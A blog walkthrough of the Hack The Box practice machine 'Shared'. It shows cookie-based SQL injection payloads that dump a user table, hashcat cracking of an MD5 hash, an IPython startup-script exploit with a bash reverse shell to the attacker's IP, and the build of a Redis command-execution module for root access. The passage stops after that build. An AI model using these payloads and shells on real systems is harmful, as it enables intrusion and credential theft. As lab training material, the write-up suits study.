---
layout: post
title: Hack The Box Walkthrough - Shared
date: 2022-11-12
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2022/11/HTB/Shared
img: 2022/11/Shared/Shared.png
---

I really enjoyed this box. It starts with an SQL Injection. Then it continues with exploiting a known vulnerability in IPython. And finishes by exploiting a Redis that runs as root.

* Room: Shared
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Shared](https://app.hackthebox.com/machines/Shared)
* Author: [Nauten](https://app.hackthebox.com/users/27582)


## Enumeration

I started the box by running Rustscan to look for open ports on the server.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.14.107:22
Open 10.129.14.107:80
Open 10.129.14.107:443

[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-06 07:23 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Host is up, received syn-ack (0.026s latency).
Scanned at 2022-11-06 07:23:29 EST for 15s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 91e835f4695fc2e20e2746e2a6b6d865 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsjcm1tYGyIVXP0ioF03lG4xMs6JWNDImzpWnDFVmg7erh4KRulrJvaR2MGkZ4UeVQFz8jva8xsG8r9ALtST48+wRF9TniLsHcuwvRop3EVEmlImth1cjG1+BHyIwoaf7Z9R5ocRw9r5PGDO8hydQTwGv4n/foMQJOu3WhIsz8532utbYpdiERTIAbB2xtC4eol
cDNLJ9LptizWpUS5/Jm5BrpYODb6OIM8rWjZyJqJgehA63kqN5oEMP6eoiW+t95DuZoLPLtH+/Y4GAO5gjYmj+rfRDSYlBXQQ94hk/yxqvfMI/jfIgEPXLuCBaE2WPm+SYDUZ0HsuV70F6dobs+q/SNYT1jjSgQFi6hA1ZpSIjGPBl9aaB+vEF5fQcA+z/nWwfaYMqUu3utQNvi0ejZ3UQgbF6P0pVD/NlbX9jT2cRC
3Og3rL2Mhhq7kIXYxS6n1UxNbhYD7PQHs7lhDMIinTj2U8Z1TjFujWWO2VGzarJXtZcFKV2TPfEwilN0yM8=
|   256 cffcc45d84fb580bbe2dad35409dc351 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBljy8WbFpXolV3MJQIZVSUOoLE6xK6KMEF5B1juVK5pOmj3XlfkjDwPbQ5svG18n7lIuaeFMpggTrftBjUWKOk=
|   256 a3386d750964ed70cf17499adc126d11 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWVTnJGzAgwIazusSrn+ULowTr1vEHVIVQzxj0u2W+y
80/tcp  open  http     syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US/localityName=None
| Issuer: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US/localityName=None
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-20T13:37:14
| Not valid after:  2042-03-15T13:37:14
| MD5:   fb0b4ab49ee7d95dae43239afca4c59e
| SHA-1: 6ccda1035d29a4410aa20e3279c483e1750ad0a0
| -----BEGIN CERTIFICATE-----
| MIIDgTCCAmmgAwIBAgIUfRY/CTV1JRpsij80nJ2qVo8C0sUwDQYJKoZIhvcNAQEL
| BQAwUDELMAkGA1UEBhMCVVMxDTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUx
| DDAKBgNVBAoMA0hUQjEVMBMGA1UEAwwMKi5zaGFyZWQuaHRiMB4XDTIyMDMyMDEz
...
| znFVUvL3buLlMUy7TLdw4bJNJUdFXviq++Gu/n1uER6nSLMwGw==
|_-----END CERTIFICATE-----
|_http-title: Did not follow redirect to https://shared.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
...
Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds
```

Port 22 (SSH), 80 (HTTP), and 443 (HTTPS) were open.

I opened a browser to the website and got redirected to 'http://shared.htb'. So I added the domain name to my hosts file and reloaded the page.

I launched Wfuzz to scan for subdomains. It found some.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 11 -H "Host:FUZZ.shared.htb" "http://shared.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shared.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000098389:   200        64 L     151 W      3229 Ch     "checkout"
000588825:   302        0 L      0 W        0 Ch        "www"
000594736:   200        64 L     151 W      3229 Ch     "www.checkout"

Total time: 801.7601
Processed Requests: 648201
Filtered Requests: 648198
Requests/sec.: 808.4724
```
I added the subdomains to my hosts file.

I tried scanning for hidden pages with Feroxbuster, but the server started giving me errors. I tried to slow it down, but it didn't help. So I left it aside and started manually looking at the site.

![Main Site](/assets/images/2022/11/Shared/MainSite.png "Main Site")

It was an e-commerce site built with [PrestaShop](https://www.prestashop.com/en). I looked around the site a little. When I tried to buy something on it, I got sent to a custom checkout page.

![Checkout](/assets/images/2022/11/Shared/Checkout.png "Checkout")


## SQL Injection

I looked at the request sent to the checkout page.

```http
GET / HTTP/1.1
Host: checkout.shared.htb
Cookie: PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def5020075467da126ceddbea70da4d5188c9bb7ee5d526eab6dbc39a9bc1fbfaa91d7a468cd8b20615c2b3adc61f6997152eebe72c8d888cdc3f20c5e688bbaefa37a13bed800d47bcdcd503b84d5421f8319214537c73716658ad9b0f807e7073943ddc0efb1658ed527585a8e8be8f684e01d277c28dbf7d92a67686db36f63e3c6164c6f31d8b8c438661638fe1f2e5d9802788d983c1fc3272e110dc07b6141e6bd025c05b1086646c5774a610ac76a02b7822e07482a7acc738ece77c582d6abd2afc95388ecf326366f07ae5b8b58d76d26666dbcd8b09f768bdca3ce9293a75b2c592d2a7c613daa8e86778804d3bc1e21f0723c072efc0c8260286fca4a067815955416857b2126aba18bbfd452f0ac7cfc8a; custom_cart=%7B%22YCS98E4A%22%3A%221%22%7D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://shared.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

There was a cookie called `custom_cart` that contained some URL-encoded JSON: `{"YCS98E4A":"1"}`. It looked like the ID of the product I was buying, and the quantity.

I thought this might be vulnerable to [SQL injection](https://portswigger.net/web-security/sql-injection). I tried sending a simple injection. I URL-encoded `{"YCS98E4A' or 1 = 1 -- -":"1"}` and sent it in the cookie.

```http
GET / HTTP/2
Host: checkout.shared.htb
Cookie: PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def5020075467da126ceddbea70da4d5188c9bb7ee5d526eab6dbc39a9bc1fbfaa91d7a468cd8b20615c2b3adc61f6997152eebe72c8d888cdc3f20c5e688bbaefa37a13bed800d47bcdcd503b84d5421f8319214537c73716658ad9b0f807e7073943ddc0efb1658ed527585a8e8be8f684e01d277c28dbf7d92a67686db36f63e3c6164c6f31d8b8c438661638fe1f2e5d9802788d983c1fc3272e110dc07b6141e6bd025c05b1086646c5774a610ac76a02b7822e07482a7acc738ece77c582d6abd2afc95388ecf326366f07ae5b8b58d76d26666dbcd8b09f768bdca3ce9293a75b2c592d2a7c613daa8e86778804d3bc1e21f0723c072efc0c8260286fca4a067815955416857b2126aba18bbfd452f0ac7cfc8a; custom_cart=%7B%22YCS98E4A'%20or%201%20=%201%20--%20-%22:%221%22%7D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://shared.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Fetch-User: ?1
Te: trailers
```

The response contained a different product. The injection seems to work, the product must have been the first one returned by the query.

```html
...
<tr>
    <th scope="row">1</th>
    <td>53GG2EF8</td>
    <td>1</td>
    <td>$23,90</td>
<tr>
...
```

I experimented with the SQL Injection and found out that the query was returning 3 columns. I used it to get the list of tables in the database.

```json
{"a' UNION SELECT 1, GROUP_CONCAT(CONCAT(TABLE_SCHEMA, ' - ', TABLE_NAME, '\\n')), 3 FROM INFORMATION_SCHEMA.TABLES -- -":"1"}
```


```http
GET / HTTP/2
Host: checkout.shared.htb
Cookie: PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def502002bdb708c4fa7f65fd363fe53a653f598b84b8bbfe826f7b89e482f639bed287e3822f9f9f97c64d760357d94c68c12f10902868f12214f4ad0b041b1a55be99daea0d9fb30c36f0e9d7bc751628c78bda48c22671f8193db6d17993dda680ed7bbc86140f7fbc0a52f62d2138e79e4e9669853b3266288499a490d7f7f659a32df04f7fec9ece033456498ae23e9d6adc7117d46f06f83143cb1363bcc2c55cff21503a9493996045f38182be9e63de67efcc8b340aea75976c87cefb79d4f9c679a7ff2b822066c7e532f1f42d93710160ed5d0cbcb303bf88ca0642b2bee54b282f41436cdc858c8bd622398b00318b6d9ede91ec440132682809f5d18cf52f427e2bab1cad87879bdb136cc4df155811c18; custom_cart=%7B%22a'%20UNION%20SELECT%201,%20GROUP_CONCAT(CONCAT(TABLE_SCHEMA,%20'%20-%20',%20TABLE_NAME,%20'%5C%5Cn')),%203%20FROM%20INFORMATION_SCHEMA.TABLES%20--%20-%22:%221%22%7D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://shared.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Fetch-User: ?1
Te: trailers
```


```
information_schema - ALL_PLUGINS
,information_schema - APPLICABLE_ROLES
,information_schema - CHARACTER_SETS
...
,checkout - user
,checkout - product
```

I then used the same technique to get the list of columns in the checkout database.

```json
{"a' UNION SELECT 1, GROUP_CONCAT(CONCAT(TABLE_NAME, ' - ', COLUMN_NAME, '\\n')), 3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'checkout' -- -":"1"}
```

```http
GET / HTTP/2
Host: checkout.shared.htb
Cookie: PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def502002bdb708c4fa7f65fd363fe53a653f598b84b8bbfe826f7b89e482f639bed287e3822f9f9f97c64d760357d94c68c12f10902868f12214f4ad0b041b1a55be99daea0d9fb30c36f0e9d7bc751628c78bda48c22671f8193db6d17993dda680ed7bbc86140f7fbc0a52f62d2138e79e4e9669853b3266288499a490d7f7f659a32df04f7fec9ece033456498ae23e9d6adc7117d46f06f83143cb1363bcc2c55cff21503a9493996045f38182be9e63de67efcc8b340aea75976c87cefb79d4f9c679a7ff2b822066c7e532f1f42d93710160ed5d0cbcb303bf88ca0642b2bee54b282f41436cdc858c8bd622398b00318b6d9ede91ec440132682809f5d18cf52f427e2bab1cad87879bdb136cc4df155811c18; custom_cart=%7B%22a'%20UNION%20SELECT%201,%20GROUP_CONCAT(CONCAT(TABLE_NAME,%20'%20-%20',%20COLUMN_NAME,%20'%5C%5Cn')),%203%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_SCHEMA%20=%20'checkout'%20--%20-%22:%221%22%7D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://shared.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Fetch-User: ?1
Te: trailers
```

```html
<td>
user - id
,user - username
,user - password
,product - id
,product - code
,product - price
</td>
```

Lastly, I extracted the list of users.

```json
{"a' UNION SELECT 1, GROUP_CONCAT(CONCAT(username, ' - ', password, '\\n')), 3 FROM checkout.user -- -":"1"}
```

```http
GET / HTTP/2
Host: checkout.shared.htb
Cookie: PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def502002bdb708c4fa7f65fd363fe53a653f598b84b8bbfe826f7b89e482f639bed287e3822f9f9f97c64d760357d94c68c12f10902868f12214f4ad0b041b1a55be99daea0d9fb30c36f0e9d7bc751628c78bda48c22671f8193db6d17993dda680ed7bbc86140f7fbc0a52f62d2138e79e4e9669853b3266288499a490d7f7f659a32df04f7fec9ece033456498ae23e9d6adc7117d46f06f83143cb1363bcc2c55cff21503a9493996045f38182be9e63de67efcc8b340aea75976c87cefb79d4f9c679a7ff2b822066c7e532f1f42d93710160ed5d0cbcb303bf88ca0642b2bee54b282f41436cdc858c8bd622398b00318b6d9ede91ec440132682809f5d18cf52f427e2bab1cad87879bdb136cc4df155811c18; custom_cart=%7B%22a'%20UNION%20SELECT%201,%20GROUP_CONCAT(CONCAT(username,%20'%20-%20',%20password,%20'%5C%5Cn')),%203%20FROM%20checkout.user%20--%20-%22:%221%22%7D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://shared.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Fetch-User: ?1
Te: trailers
```


```html
<tr>
    <th scope="row">1</th>
    <td>james_mason - fc895d4eddc2fc12f995e18c865cf273
    </td>
    <td>1</td>
    <td>$3,00</td>
</tr>
```

I took the user's password and cracked it with hashcat.

```bash
$ hashcat -a0 -m0 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2873/5810 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

fc895d4eddc2fc12f995e18c865cf273:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: fc895d4eddc2fc12f995e18c865cf273
Time.Started.....: Sun Nov  6 14:33:31 2022 (1 sec)
Time.Estimated...: Sun Nov  6 14:33:32 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5186.2 kH/s (0.12ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2092032/14344384 (14.58%)
Rejected.........: 0/2092032 (0.00%)
Restore.Point....: 2088960/14344384 (14.56%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: TEAMOCRUZ -> SexyThang
Hardware.Mon.#1..: Util: 15%

Started: Sun Nov  6 14:33:18 2022
Stopped: Sun Nov  6 14:33:33 2022
```

I used that password to connect to the server.

```bash
$ ssh james_mason@target
The authenticity of host 'target (10.129.14.133)' can't be established.
ED25519 key fingerprint is SHA256:UXHSnbXewSQjJVOjGF5RVNToyJZqtdQyS8hgr5P8pWM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
james_mason@target's password:
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~$ ls
james_mason@shared:~$ ls -la
total 20
drwxr-xr-x 2 james_mason james_mason 4096 Jul 14 13:46 .
drwxr-xr-x 4 root        root        4096 Jul 14 13:46 ..
lrwxrwxrwx 1 root        root           9 Mar 20  2022 .bash_history -> /dev/null
-rw-r--r-- 1 james_mason james_mason  220 Mar 20  2022 .bash_logout
-rw-r--r-- 1 james_mason james_mason 3526 Mar 20  2022 .bashrc
-rw-r--r-- 1 james_mason james_mason  807 Mar 20  2022 .profile
```

## Lateral Movement

Once connected, I looked for ways to get more privileges. I could not run `sudo`, and the server did not have any suspicious suid binaries.

```bash
james_mason@shared:~$ sudo -l
-bash: sudo: command not found

james_mason@shared:~$ find / -perm /u=s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

I looked in the website configurations and found the password to the PrestaShop database. I connected to the database and found a password hash in the employee table. I tried cracking that password, but it failed.

Next, I looked for local ports on the server.

```bash
james_mason@shared:/var/www/shared.htb/ps$ ss -tunl
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                   Process
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                             0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:443                                            0.0.0.0:*
tcp                     LISTEN                   0                        80                                             127.0.0.1:3306                                           0.0.0.0:*
tcp                     LISTEN                   0                        511                                            127.0.0.1:6379                                           0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                             0.0.0.0:*
tcp                     LISTEN                   0                        128                                                 [::]:22                                                [::]:*
```

The Redis port was open, and I saw in `ps` that it was running as root. But when I tried connecting to it, it required a password. I tried the passwords I found before, but none worked.

```bash
james_mason@shared:/var/www/shared.htb/ps$ redis-cli
127.0.0.1:6379> keys *
(error) NOAUTH Authentication required.
```

I then looked at the groups the user was in.

```bash
james_mason@shared:~$ groups
james_mason developer

james_mason@shared:~$ find / -group developer 2>/dev/null
/opt/scripts_review

james_mason@shared:~$ ls -ld /opt/scripts_review/
drwxrwx--- 2 root developer 4096 Jul 14 13:46 /opt/scripts_review/

james_mason@shared:~$ ls -la /opt/scripts_review/
total 8
drwxrwx--- 2 root developer 4096 Jul 14 13:46 .
drwxr-xr-x 3 root root      4096 Jul 14 13:46 ..
```

The user was in the developer group. And that group could write to the `/opt/scripts_review/` folder. I tried putting scripts in there to see if they were executed. I tried with bash, PHP, and Python scripts that would make a get request to my machine. The scripts were removed, but I did not get a hit on my web server.

I downloaded [pspy](https://github.com/DominicBreuker/pspy) on the server to find the script that was removing my files.

```bash
james_mason@shared:~$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/11/06 19:51:03 CMD: UID=0    PID=92     |
...
2022/11/06 15:37:01 CMD: UID=1001 PID=4261   | /usr/bin/pkill ipython
2022/11/06 15:37:01 CMD: UID=1001 PID=4260   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
```

The was a cronjob running [IPython](https://ipython.org/) in the folder. I made a quick search and found a [vulnerabilitiy that allowed running code](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x) as the user who ran IPython.

I needed to create a profile with a startup script in the folder where IPython was run. The script would then be executed as the user launching IPython.

I tried getting it to make a web request to my machine first. To see if I could get code execution. I created the script in my home folder.

```bash
james_mason@shared:~$ cat test.py
#!/usr/bin/python3

import os

os.system('wget http://10.10.14.143/python')
```

Then I created the needed folders and copied the file there. 

```bash
james_mason@shared:~$ mkdir /opt/scripts_review/profile_default ; chmod 777 /opt/scripts_review/profile_default ; mkdir /opt/scripts_review/profile_default/startup ; chmod 777 /opt/scripts_review/profile_default/startup ; cp test.py /opt/scripts_review/profile_default/startup/
```

I started a local web server on my machine and waited for the cron to run.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.14.133 - - [06/Nov/2022 15:54:01] code 404, message File not found
10.129.14.133 - - [06/Nov/2022 15:54:01] "GET /python HTTP/1.1" 404 -
```

It worked! I modified the script to create a reverse shell.

```bash
james_mason@shared:~$ cat test.py
#!/usr/bin/python3

import os

os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.143/4444 0>&1'")
```

I started a netcat listener on my machine and used the same commands as before to copy the file.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.143] from (UNKNOWN) [10.129.14.133] 45516
bash: cannot set terminal process group (5615): Inappropriate ioctl for device
bash: no job control in this shell

dan_smith@shared:/opt/scripts_review$ cd
cd

dan_smith@shared:~$ pwd
pwd
/home/dan_smith

dan_smith@shared:~$ cat user.txt
cat user.txt
REDACTED
```

## Privilege Escalation

Once I got the shell as dan_smith, I looked in their home folder. They had a private key in `.ssh`. I copied it to my machine and reconnected using SSH.

I checked the groups the user was in. They were in `sysadmin`. That group was allowed to run a script called `redis_connector_dev`. 

```bash
dan_smith@shared:~$ groups
dan_smith developer sysadmin

dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev


dan_smith@shared:~$ /usr/local/bin/redis_connector_dev "keys *"
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:5863
run_id:5be306fb97264243a2d4bf40d9dbacc0f5e8e186
tcp_port:6379
uptime_in_seconds:1
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:6824323
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

The program was connecting to Redis, using the password. I used scp to copy the binary to my machine and opened it in Ghidra.

![Ghidra](/assets/images/2022/11/Shared/Ghidra.png "Ghidra")

The program was simply connecting to Redis and getting some information out. The password was in the program. 

![Password](/assets/images/2022/11/Shared/Password.png "Password")

Since [Go does not use null-terminated strings](https://cujo.com/reverse-engineering-go-binaries-with-ghidra/), I looked at the code to see that it was reading 16 characters and used that to extract the password.

![16 Characters](/assets/images/2022/11/Shared/16.png "16 Characters")

I tried the password in Redis, and it worked. 

```bash
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> auth REDACTED
OK
127.0.0.1:6379>
```

Now I had to use Redis to get a shell as root. HackTricks has a nice page on [Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis). I tried a few of the techniques, and I got the one that [loads a module](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module) to work.

I download the [module code from GitHub](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) and compiled it on the server.

```bash
dan_smith@shared:~/RedisModules-ExecuteCommand-master$ make
make -C ./src
make[1]: Entering directory '/home/dan_smith/RedisModules-ExecuteCommand-master/src'
make -C ../rmutil
make[2]: Entering directory '/home/dan_smith/RedisModules-ExecuteCommand-master/rmutil'
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o util.o util.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o strings.o strings.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o sds.o sds.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o vector.o vector.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o alloc.o alloc.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o periodic.o periodic.c
ar rcs librmutil.a util.o strings.o sds.o vector.o alloc.o periodic.o
make[2]: Leaving directory '/home/dan_smith/RedisModules-ExecuteCommand-master/rmutil'
gcc -I../ -Wall -g -fPIC -lc -lm -std=gnu99     -c -o module.o module.c
module.c: In function ‘DoCommand’:
module.c:16:29: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   16 |                 char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                             ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:23:29: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
...
module.c:57:3: warning: null argument where non-null required (argument 2) [-Wnonnull]
   57 |   execve("/bin/sh", 0, 0);
      |   ^~~~~~
ld -o module.so module.o -shared -Bsymbolic  -L../rmutil -lrmutil -lc
make[1]: Leaving directory '/home/dan_smith/RedisModules-ExecuteCommand-master/src'
cp ./src/module.so .

dan_smith@shared:~/RedisModules-ExecuteCommand-master$ ls -la
total 116
drwxr-xr-x 4 dan_smith dan_smith  4096 Nov  6 17:16 .
drwxr-xr-x 5 dan_smith dan_smith  4096 Nov  6 17:13 ..
-rw-r--r-- 1 dan_smith dan_smith  1909 Jul  9  2019 .clang-format
-rw-r--r-- 1 dan_smith dan_smith    45 Jul  9  2019 .gitignore
-rw-r--r-- 1 dan_smith dan_smith  1077 Jul  9  2019 LICENSE
-rw-r--r-- 1 dan_smith dan_smith   472 Jul  9  2019 Makefile
-rwxr-xr-x 1 dan_smith dan_smith 47856 Nov  6 17:16 module.so
